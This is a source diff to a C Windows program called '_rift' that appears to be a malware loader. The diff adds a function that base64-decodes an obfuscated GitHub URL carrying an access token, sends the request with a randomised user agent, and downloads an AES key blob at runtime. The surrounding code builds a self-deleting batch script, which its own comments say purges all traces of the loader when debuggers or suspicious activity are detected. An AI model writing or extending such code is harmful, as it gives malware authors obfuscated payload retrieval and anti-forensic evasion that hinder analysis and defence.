@@ -1,6 +1,8 @@
 #include "pch.h"
 #include "_rift.h"
 
+PVOID fnDownloadKey();
+
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
@@ -25,26 +27,27 @@ INT WINAPI wWinMain(
 	fnInitializeXSR();
 
 	{	// Test base64
-		PVOID string = fnMalloc(259, 0);
+		PVOID string = HAlloc(259, 0);
 		for (int i = 0; i < 259; i++)
 			((PBYTE)string)[i] = (BYTE)(fnNext128p() >> 24);
-		CopyMemory(string, "Hello this is a test string", 28);
+		CopyMemory(string, "https://raw.githubusercontent.com/Lima-X-Coding/Win32._rift/master/_rift/main.c?token=AISLTIFBLEXNHDBHX6Z2FOS63QJ3U", 116);
 		PVOID hash = fnMD5HashData(string, 4);
 
 		SIZE_T bout;
-		PVOID base = fnB64Encode(string, 4, &bout);
-		fnFree(string);
+		PVOID base = fnB64Encode(string, 116, &bout);
+		HFree(string);
 		PVOID base2 = fnB64Decode(base, bout, &bout);
-		fnFree(base);
+		HFree(base);
 
 		PVOID hash2 = fnMD5HashData(base2, 4);
-		fnFree(base2);
+		HFree(base2);
 		BOOL test = fnMD5Compare(hash, hash2);
 
-		fnFree(hash);
-		fnFree(hash2);
+		HFree(hash);
+		HFree(hash2);
 	}
 
+	PVOID pKey = fnDownloadKey();
 	// init con
 	fnOpenConsole();
 
@@ -76,7 +79,8 @@ INT WINAPI wWinMain(
 
 	FreeLibrary(dhDll);
 #endif
-	fnFree(pDll, 0);
+	SecureZeroMemory(pDll, nDll);
+	HFree(pDll);
 
 	{	// CleanUp
 		HANDLE hPH = GetProcessHeap();
@@ -85,12 +89,40 @@ INT WINAPI wWinMain(
 	} return 0;
 }
 
+// Only Test rn but might be implemented further
+PVOID fnDownloadKey() {
+	PCWSTR szAgent = fnAllocRandomB64W(8, 16);
+	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
+	HFree(szAgent);
+	INT a = GetLastError();
+
+	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
+	SIZE_T nURL;
+	PCSTR szURL = fnB64Decode(szB64URL, 156, &nURL);
+	HINTERNET hURL = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
+
+	a = GetLastError();
+	HFree(szURL);
+
+	PVOID pBuffer = HAlloc(AES_BLOB_SIZE, 0);
+
+	SIZE_T nRead;
+	InternetReadFile(hURL, pBuffer, AES_BLOB_SIZE, &nRead);
+
+	InternetCloseHandle(hURL);
+	InternetCloseHandle(hNet);
+
+	return pBuffer;
+}
+
+
+
 /*	This function basically does what it's called,
 	it "cleans" (or better purges) everything it can and tries to destroy
 	all traces of it self (the loader and everything else it extracts).
 	It should get triggered ( / called) if any fatal error occurs,
 	or the loader catches any suspicious activities (e.g. debuggers).  */
-CONST static WCHAR t_szSelfDelBat[] = {
+static CONST WCHAR t_szSelfDelBat[] = {
 	L"@echo off\n"
 	L"%x:\n"
 	L"\tdel \"%s\" /f\n"
@@ -101,7 +133,7 @@ CONST static WCHAR t_szSelfDelBat[] = {
 };
 VOID fnPurge() {
 	// Prepare String for Filename of Batchfile
-	PWSTR szFilePath = (PWSTR)fnMalloc(MAX_PATH * sizeof(WCHAR), 0);
+	PWSTR szFilePath = (PWSTR)HAlloc(MAX_PATH * sizeof(WCHAR), 0);
 	SIZE_T nRandom;
 	PCWSTR szRandom = fnAllocRandomPathW(8, 16, &nRandom);
 	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
@@ -109,7 +141,7 @@ VOID fnPurge() {
 	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");
 
 	// Prepare Script content
-	PVOID pScriptW = fnMalloc(0x800, 0);
+	PVOID pScriptW = HAlloc(0x800, 0);
 	UINT uiRandomID = fnNext128ss();
 	PCWSTR szMFN = fnGetFileNameFromPathW(g_PIB->szMFN);
 	StringCchPrintfW(pScriptW, 0x400, t_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));
@@ -119,9 +151,9 @@ VOID fnPurge() {
 	StringCchLengthW(pScriptW, 0x400, &nScript);
 	PSTR pScriptA = (PSTR)HeapAlloc(g_PIB->hPH, 0, 0x400);
 	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
-	fnFree(pScriptW);
+	HFree(pScriptW);
 
 	// Write to Disk
 	fnWriteFileCW(szFilePath, pScriptA, nScript);
-	fnFree(pScriptA);
+	HFree(pScriptA);
 }
